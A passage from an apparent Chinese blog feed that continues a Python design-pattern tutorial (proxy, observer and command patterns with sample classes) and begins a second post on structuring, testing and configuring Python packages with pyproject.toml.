class="variable language_">self</span>.retriever.retrieve(query)</span><br><span class="line"><span class="comment"># 缓存的代理</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CachingProxyRetriever</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, retriever</span>):</span><br><span class="line">        <span class="variable language_">self</span>.retriever = retriever</span><br><span class="line">        <span class="variable language_">self</span>.cache = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">retrieve</span>(<span class="params">self, query</span>):</span><br><span class="line">        <span class="keyword">if</span> query <span class="keyword">in</span> <span class="variable language_">self</span>.cache:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Returning cached result for query: <span class="subst">&#123;query&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.cache[query]</span><br><span class="line"></span><br><span class="line">        result = <span class="variable language_">self</span>.retriever.retrieve(query)</span><br><span class="line">        <span class="variable language_">self</span>.cache[query] = result</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># 日志的代理</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoggingProxyRetriever</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, retriever</span>):</span><br><span class="line">        <span class="variable language_">self</span>.retriever = retriever</span><br><span class="line">        <span class="variable language_">self</span>.logs = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">retrieve</span>(<span class="params">self, query</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Logging query: <span class="subst">&#123;query&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.logs.append(query)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.retriever.retrieve(query)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_logs</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.logs</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代理模式的牛逼之处，就是可以直接组合起来，因为这些类都实现了 <code>retriever</code> 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建项目和 Codebase</span></span><br><span class="line">project = Project(<span class="string">&quot;MyProject&quot;</span>, [<span class="string">&quot;file1.py&quot;</span>, <span class="string">&quot;file2.py&quot;</span>])</span><br><span class="line">codebase = Codebase(project)</span><br><span class="line">retriever = Retriever(codebase)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 包装多个代理</span></span><br><span class="line">log_proxy = LoggingProxyRetriever(retriever)</span><br><span class="line">cache_proxy = CachingProxyRetriever(log_proxy)  <span class="comment"># 使用日志代理作为缓存代理的底层</span></span><br><span class="line">access_proxy = AccessControlProxyRetriever(cache_proxy, authorized_users)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 授权访问检索并记录日志和缓存</span></span><br><span class="line"><span class="built_in">print</span>(access_proxy.retrieve(<span class="string">&quot;file1&quot;</span>, <span class="string">&quot;Alice&quot;</span>))</span><br></pre></td></tr></table></figure><h2 id="单例模式">单例模式</h2><p>参考元类编程。</p><h2 id="观察者模式">观察者模式</h2><p>观察者模式（Observer Pattern）是一种行为型模式，它定义了一种一对多的依赖关系，让多个观察者对象监听某一个主题对象。主题在状态发生变化时会通知所有观察者，观察者可以随时动态增删。这种设计使得观察者与主题解耦，提高了代码的灵活性和可维护性。</p><p>这种模式在事件订阅，pub-sub 系统非常常见，非常实用。pub 和 sub 可以非常干净的解耦。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Subject</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.__observers = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">self, observer</span>):</span><br><span class="line">        <span class="variable language_">self</span>.__observers.append(observer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unregister</span>(<span class="params">self, observer</span>):</span><br><span class="line">        <span class="variable language_">self</span>.__observers.remove(observer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">notifyAll</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">for</span> observer <span class="keyword">in</span> <span class="variable language_">self</span>.__observers:</span><br><span class="line">            observer.notify(<span class="variable language_">self</span>, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Observer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, subject</span>):</span><br><span class="line">        subject.register(<span class="variable language_">self</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">notify</span>(<span class="params">self, subject, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self&#125;</span> received <span class="subst">&#123;args&#125;</span> <span class="subst">&#123;kwargs&#125;</span> from <span class="subst">&#123;subject&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">subject = Subject()</span><br><span class="line">observer1 = Observer(subject)</span><br><span class="line">observer2 = Observer(subject)</span><br><span class="line"></span><br><span class="line">subject.notifyAll(<span class="string">&quot;First notification&quot;</span>)</span><br><span class="line">subject.unregister(observer1)  <span class="comment"># 动态移除 observer1</span></span><br><span class="line">subject.notifyAll(<span class="string">&quot;Second notification&quot;</span>)  <span class="comment"># 仅 observer2 收到</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="命令模式">命令模式</h2><p>命令模式（Command Pattern）是一种行为型设计模式，它的核心思想是<strong>将请求封装成对象</strong>，从而让你可以<strong>独立地传递、保存、撤销和重做请求</strong>。每一个命令对象代表一个请求或操作，比如“创建文件”、“删除文件”、“重命名文件”等等。</p><p>在命令模式中，通常包含以下几个角色：</p><ol><li><strong>命令（Command）接口</strong>：定义执行操作的接口，所有的命令类都应该实现这个接口。</li><li><strong>具体命令（Concrete Command）类</strong>：实现命令接口，封装具体的操作行为，比如“创建文件”、“删除文件”等。</li><li><strong>接收者（Receiver）</strong>：执行具体操作的对象，命令对象通过接收者来完成操作。</li><li><strong>调用者（Invoker）</strong>：负责执行命令的类，通常会记录所有命令，并提供撤销、重做等功能。</li></ol><p><strong>定义命令接口</strong>：首先，我们定义 <code>Command</code> 接口，它包含了所有命令必须实现的 <code>execute</code> 和 <code>undo</code> 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Subclasses must implement &#x27;execute&#x27; method&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">undo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Subclasses must implement &#x27;undo&#x27; method&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>定义接收者</strong>（家电设备）：接收者是实际执行命令的家电设备。我们以灯、音响和空调为例，给每个接收者定义具体的操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Light</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">turn_on</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Light is turned ON&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">turn_off</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Light is turned OFF&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stereo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_music</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Stereo is playing music&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop_music</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Stereo stopped playing music&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AC</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_temperature</span>(<span class="params">self, temperature</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;AC temperature set to <span class="subst">&#123;temperature&#125;</span>°C&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">turn_off</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;AC is turned OFF&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>定义具体命令类</strong>：接下来，定义具体的命令类，每个命令类都会实现 <code>Command</code> 接口，并且封装特定设备的操作。每个命令对象会持有接收者的引用，以便在调用 <code>execute</code> 和 <code>undo</code> 时，执行接收者的具体操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 控制灯的命令</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LightOnCommand</span>(<span class="title class_ inherited__">Command</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, light</span>):</span><br><span class="line">        <span class="variable language_">self</span>.light = light</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.light.turn_on()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">undo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.light.turn_off()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LightOffCommand</span>(<span class="title class_ inherited__">Command</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, light</span>):</span><br><span class="line">        <span class="variable language_">self</span>.light = light</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.light.turn_off()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">undo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.light.turn_on()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 控制音响的命令</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PlayMusicCommand</span>(<span class="title class_ inherited__">Command</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stereo</span>):</span><br><span class="line">        <span class="variable language_">self</span>.stereo = stereo</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.stereo.play_music()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">undo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.stereo.stop_music()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StopMusicCommand</span>(<span class="title class_ inherited__">Command</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stereo</span>):</span><br><span class="line">        <span class="variable language_">self</span>.stereo = stereo</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.stereo.stop_music()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">undo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.stereo.play_music()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>定义调用者（Invoker）</strong>，调用者负责管理和执行命令对象，提供操作执行、撤销等功能。调用者类 <code>RemoteControl</code> 可以持有一组命令，并支持批量撤销操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RemoteControl</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.history = []  <span class="comment"># 保存已执行的命令历史</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">press_button</span>(<span class="params">self, command</span>):</span><br><span class="line">        command.execute()</span><br><span class="line">        <span class="variable language_">self</span>.history.append(command)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">undo_last</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.history:</span><br><span class="line">            command = <span class="variable language_">self</span>.history.pop()</span><br><span class="line">            command.undo()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>控制的主程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建设备对象</span></span><br><span class="line">light = Light()</span><br><span class="line">stereo = Stereo()</span><br><span class="line">ac = AC()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建具体的命令对象</span></span><br><span class="line">light_on_cmd = LightOnCommand(light)</span><br><span class="line">light_off_cmd = LightOffCommand(light)</span><br><span class="line">play_music_cmd = PlayMusicCommand(stereo)</span><br><span class="line">stop_music_cmd = StopMusicCommand(stereo)</span><br><span class="line">set_ac_temp_cmd = SetACTemperatureCommand(ac, <span class="number">22</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建调用者</span></span><br><span class="line">remote = RemoteControl()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line">remote.press_button(light_on_cmd)      <span class="comment"># 输出: Light is turned ON</span></span><br><span class="line">remote.press_button(play_music_cmd)    <span class="comment"># 输出: Stereo is playing music</span></span><br><span class="line">remote.press_button(set_ac_temp_cmd)   <span class="comment"># 输出: AC temperature set to 22°C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 撤销最近的命令</span></span><br><span class="line">remote.undo_last()                     <span class="comment"># 输出: AC is turned OFF</span></span><br><span class="line">remote.undo_last()                     <span class="comment"># 输出: Stereo stopped playing music</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>参考</h1><ul><li><a href="https://www.cnblogs.com/liuzhongkun/p/16817578.html">Python 元类详解</a></li><li><a href="https://www.guofei.site/2019/10/26/design_patterns.html">【Python】设计模式</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1&gt;类和对象&lt;/h1&gt;
&lt;h2 id=&quot;一切都是对象&quot;&gt;一切都是对象&lt;/h2&gt;
&lt;p&gt;在 Python 中，“一切皆对象”是一个核心理念。简单来说，&lt;strong&gt;Python 中的所有东西都是对象&lt;/strong&gt;，无论是数值、字符串、函数、类，甚至是模块和代码本身。Python 对象有三个特征：&lt;strong&gt;身份&lt;/strong&gt;、&lt;strong&gt;类型&lt;/strong&gt;和&lt;strong&gt;值&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;身份&lt;/strong&gt;：对象在内存中的地址，可以通过 &lt;code&gt;id()&lt;/code&gt; 函数查看，例如 &lt;code&gt;id(obj)&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：对象的类别，可以通过 &lt;code&gt;type()&lt;/code&gt; 函数查看。例如，&lt;code&gt;type(5)&lt;/code&gt; 返回 &lt;code&gt;&amp;lt;class &#39;int&#39;&amp;gt;&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;值&lt;/strong&gt;：对象的实际内容或数据，直接调用变量名即可查看</summary>
        
      
    
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/categories/developer/"/>
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/tags/developer/"/>
    
  </entry>
  
  <entry>
    <title>(二）包的开发</title>
    <link href="https://www.blog-blockchain.xyz/dev/python-package/"/>
    <id>https://www.blog-blockchain.xyz/dev/python-package/</id>
    <published>2024-10-22T03:18:20.000Z</published>
    <updated>2024-11-18T09:45:01.397Z</updated>
    
    <content type="html"><![CDATA[<p>Python 包的开发是一项重要的技能，可以帮助你组织代码、实现代码复用，并且将功能模块分发给其他开发者使用。</p><h1>包和模块是什么</h1><p>在 Python 中，一个包（Package）就是一个包含多个模块的目录，其中通过 <code>__init__.py</code> 文件来表明它是一个包。包允许你将代码逻辑分解为多个文件，并且通过模块的方式进行导入和复用。</p><ul><li>模块：一个 Python 文件（*.py 文件）就是一个模块。模块可以包含函数、类和变量。</li><li>包：包是包含多个模块的文件夹。包使得模块之间可以被组织起来，以便更好的管理。</li></ul><p>目录结构示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_package/</span><br><span class="line">    ├── __init__.py        # 包初始化文件</span><br><span class="line">    ├── module_a.py        # 模块 A</span><br><span class="line">    ├── module_b.py        # 模块 B</span><br></pre></td></tr></table></figure><p>在代码中使用包（如果要供外部使用，推荐使用相对路径）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入包中的模块</span></span><br><span class="line"><span class="keyword">from</span> my_package <span class="keyword">import</span> module_a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用模块中的函数</span></span><br><span class="line">module_a.some_function()</span><br></pre></td></tr></table></figure><p>一个典型的 python 包的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">my_package/</span><br><span class="line">    ├── my_package/        # 包目录</span><br><span class="line">    │   ├── __init__.py    # 包初始化文件</span><br><span class="line">    │   ├── module1.py     # 包中的第一个模块</span><br><span class="line">    │   └── module2.py     # 包中的第二个模块</span><br><span class="line">    ├── tests/             # 测试目录</span><br><span class="line">    │   └── test_module1.py</span><br><span class="line">    ├── README.md          # 包的说明文件</span><br><span class="line">    ├── setup.py           # 安装脚本</span><br><span class="line">    ├── pyproject.toml     # 现代构建系统配置文件</span><br><span class="line">    ├── LICENSE            # 许可证</span><br><span class="line">    └── requirements.txt   # 依赖文件</span><br></pre></td></tr></table></figure><p><code>setup.py</code> 和 <code>pyproject.toml</code> 必须存在一个，用于说明包如何安装，后者更加先进，建议使用。</p><h1>模块的初始化</h1><p><code>__init__.py</code> 是 Python 包的初始化模块，它负责定义包在被导入时的行为。</p><p><strong>包的标识</strong>：没有 <code>__init__.py</code> 的文件夹将不会被视为 Python 包（在较早的 Python 版本中这是必须的，但在 Python 3.3 及之后不是必须的了，尽管还是一个好习惯）。</p><p><strong>导入时行为</strong>：当你直接导入包时，例如 <code>import my_package</code>，只有 <code>__init__.py</code> 中定义的内容（函数、类、变量）可以被直接使用。要使用其他子模块或子包中的内容，需要显式导入它们，或在 <code>__init__.py</code> 中设置好默认的导入。当包被导入时，<code>__init__.py</code> 中的代码会被自动执行一遍。因此，如果有初始化逻辑（例如设置某些配置、加载资源），可以在 <code>__init__.py</code> 中编写，它们会在导入包时执行。但 <code>__init__.py</code> 不会作为脚本运行（即不会执行 <code>__main__</code> 语句中的内容）。</p><p><strong>导入的顺序</strong>：<strong>深度优先</strong>算法。先确保 父包初始化，在父包的初始化过程中，按照导入顺序逐步进行深度优先的子包和子模块初始化。</p><p><code>__main__.py</code> 文件的作用是在 Python 包被直接执行时，定义程序的入口点。它的功能类似于脚本的主程序入口，让包像脚本一样直接运行。<code>python -m my_package</code></p><h1>开发测试</h1><p>本地测试的时候，应该在包内使用相对路径，并且以“可编辑模式”安装到虚拟环境中。这会在虚拟环境或全局环境中创建一个符号链接，指向包的源代码目录，修改源代码会立即生效。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -e .</span><br></pre></td></tr></table></figure><p>单元测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tests/test_module1.py</span></span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> my_package.module1 <span class="keyword">import</span> some_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestModule1</span>(unittest.TestCase):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_some_function</span>(<span class="params">self</span>):</span><br><span class="line">        result = some_function()</span><br><span class="line">        <span class="variable language_">self</span>.assertEqual(result, <span class="string">&quot;expected result&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><p>还有简单的测试，文件以 <code>_test.py</code> 结尾，然后函数以 <code>test_</code> 开头，依赖 pytest。</p><h1>安装包</h1><p>下面是一个传统的 pyproject 的定义，<code>[build-system]</code> 里这两者一般都不用变动。</p><ul><li>requires 指定了构建项目所需的工具和版本。在这个例子中，你需要 setuptools 版本 &gt;= 61.0 来进行包的构建。</li><li>build-backend 指定了构建后端，这里使用的是 setuptools 的构建元数据模块 setuptools.build_meta。</li></ul><p><code>[project]</code>是核心的配置参数</p><ul><li>requires-python：表明 Python 版本的要求，这里要求 Python &gt;= 3.9。</li><li>classifiers：这些是 Python 包的元数据，用于描述包的兼容性、用途和许可证等。</li><li>dependencies：列出了包的依赖项，当其他人安装此包时，这些依赖项也会被自动安装。</li></ul><p><code>[tool.setuptools.packages.find]</code> 告诉 setuptools 如何找到包。这里它会从当前目录中找到所有以 sgp 开头的包。</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[build-system]</span></span><br><span class="line"><span class="attr">requires</span> = [<span class="string">&quot;setuptools&gt;=61.0&quot;</span>]</span><br><span class="line"><span class="attr">build-backend</span> = <span class="string">&quot;setuptools.build_meta&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[project]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;openzeppelin-solidity-grammar-parser&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.0.4&quot;</span></span><br><span class="line"><span class="attr">authors</span> = [&#123; name = <span class="string">&quot;Georgii Plotnikov&quot;</span>, email = <span class="string">&quot;accembler@gmail.com&quot;</span> &#125;]</span><br><span class="line"><span class="attr">description</span> = <span class="string">&quot;Solidity ANTLR4 grammar Python parser&quot;</span></span><br><span class="line"><span class="attr">readme</span> = <span class="string">&quot;README.md&quot;</span></span><br><span class="line"><span class="attr">requires-python</span> = <span class="string">&quot;&gt;=3.9&quot;</span></span><br><span class="line"><span class="attr">classifiers</span> = [</span><br><span class="line">    <span class="string">&quot;Programming Language :: Python :: 3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;License :: OSI Approved :: MIT License&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Operating System :: OS Independent&quot;</span>,</span><br><span class="line">]</span><br><span class="line"><span class="attr">dependencies</span> = [</span><br><span class="line">    <span class="string">&quot;antlr4-python3-runtime == 4.13.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;coverage == 7.3.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;simplejson == 3.19.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typing == 3.7.4.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typing_extensions == 4.8.0&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="section">[project.urls]</span></span><br><span class="line"><span class="attr">&quot;Homepage&quot;</span> = <span class="string">&quot;https://github.com/OpenZeppelin/sgp&quot;</span></span><br><span class="line"><span class="attr">&quot;Bug Tracker&quot;</span> = <span class="string">&quot;https://github.com/OpenZeppelin/sgp/issues&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[tool.setuptools.packages.find]</span></span><br><span class="line"><span class="attr">where</span> = [<span class="string">&quot;.&quot;</span>]</span><br><span class="line"><span class="attr">include</span> = [<span class="string">&quot;sgp*&quot;</span>]</span><br></pre></td></tr></table></figure><p>对于 poetry 工具，需要另外一套配置，则把元信息，运行时依赖依赖和开发时的依赖，构建系统都写的比较清楚。<code>poetry build</code> 的效果和 